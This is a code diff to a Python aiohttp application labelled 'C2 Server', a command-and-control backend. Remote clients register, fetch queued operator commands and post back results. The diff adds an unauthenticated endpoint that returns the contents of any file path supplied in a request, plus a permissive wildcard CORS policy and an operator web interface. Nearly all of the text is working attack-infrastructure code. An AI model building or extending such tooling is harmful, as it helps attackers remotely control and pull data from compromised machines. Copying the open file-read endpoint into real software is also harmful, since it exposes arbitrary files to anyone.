@@ -3,6 +3,7 @@ import asyncio
 from aiohttp import web
 import json
 import time
+import os
 
 # In-memory storage for connected clients and commands
 clients = {}
@@ -25,20 +26,18 @@ async def get_command(request): #client is "authenticated" and sends commands to
     """Sends a command to a client."""
     client_id = request.match_info.get("client_id")
     
-    if client_id not in clients: #if connection attempt comes from client that is not registered
-        return web.json_response({"error": "Client not found"}, status=404)
+    if client_id not in clients: #check if client is registered
+        return web.json_response({"error": "Client not found"}, status=404) #if client is not registered, return error
 
     if client_id not in commands:
-        return web.json_response({"error": "Client not found"}, status=404)  # <-- This is your error
+        return web.json_response({"error": "Client not found"}, status=404) #if client is registered but no commands are present
     
     if commands[client_id]:
-        return web.json_response({"command": commands[client_id].pop(0)})
+        return web.json_response({"command": commands[client_id].pop(0)}) #if client is registered and commands are present, return command
     
-    return web.json_response({"command": None})  # No command yet
+    return web.json_response({"command": None})
 
-    command = commands.pop(client_id, None)  # Retrieve and remove the command
-    return web.json_response({"command": command if command else "ping"})
-
+#Receive results from clients
 async def post_result(request):
     """Receives results from clients."""
     data = await request.json()
@@ -51,41 +50,70 @@ async def post_result(request):
     print(f"Received result from {client_id}: {result}")
     return web.json_response({"message": "Result received"})
 
+#Issue command to a specific client
 async def issue_command(request):
     """Issues a command to a specific client."""
     data = await request.json()
     client_id = data.get("client_id")
     command = data.get("command")
 
+#Check if client_id and command are present
     if not client_id or not command:
         return web.json_response({"error": "Missing data"}, status=400)
-
+#Check if client_id is registered
     commands[client_id] = command
-    return web.json_response({"message": f"Command '{command}' sent to {client_id}"})
+    return web.json_response({"message": f"Command '{command}' sent to {client_id}"}) #Return message to server - command sent to client
+
+#Upload file to client
+async def upload_file(request):
+    """Handles file upload requests from clients."""
+    data = await request.json()
+    client_id = data.get("client_id")
+    file_path = data.get("file_path")
+
+    if not client_id or not file_path:
+        return web.json_response({"error": "Missing data"}, status=400)
+
+    if not os.path.exists(file_path):
+        return web.json_response({"error": "File not found"}, status=404)
+
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+
+    return web.json_response({"file_data": file_data.decode('latin1')})
 
 async def index(request):
-    return web.Response(text="C2 Server Running", content_type="json") #text/html
+    """Serve the HTML interface on the root URL."""
+    try:
+        with open('interface.html', 'r') as f:
+            html_content = f.read()
+        return web.Response(text=html_content, content_type='text/html')
+    except FileNotFoundError:
+        return web.Response(text="HTML interface file not found. Please create interface.html", 
+                           content_type="text/plain")
 
-async def index(request):
-    return web.FileResponse("c2_webInterface.html")
 
+#Main function
 app = web.Application()
-app.router.add_get("/", index)
 
+# Configure CORS to allow browser requests
+async def cors_middleware(app, handler):
+    async def middleware_handler(request):
+        response = await handler(request)
+        response.headers['Access-Control-Allow-Origin'] = '*'
+        response.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
+        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+        return response
+    return middleware_handler
 
-app = web.Application()
-app.router.add_post("/register", register_client)  
-app.router.add_get("/command/{client_id}", get_command)  
-app.router.add_get("/", index)  # Add this route
+app.middlewares.append(cors_middleware)
 
-web.run_app(app, host="localhost", port=8080)
-
-app = web.Application()
 app.add_routes([
     web.post("/register", register_client),
     web.get("/command/{client_id}", get_command),
     web.post("/result", post_result),
-    web.post("/issue_command", issue_command)
+    web.post("/issue_command", issue_command),
+    web.post("/upload_file", upload_file)
 ])
 
 if __name__ == "__main__":
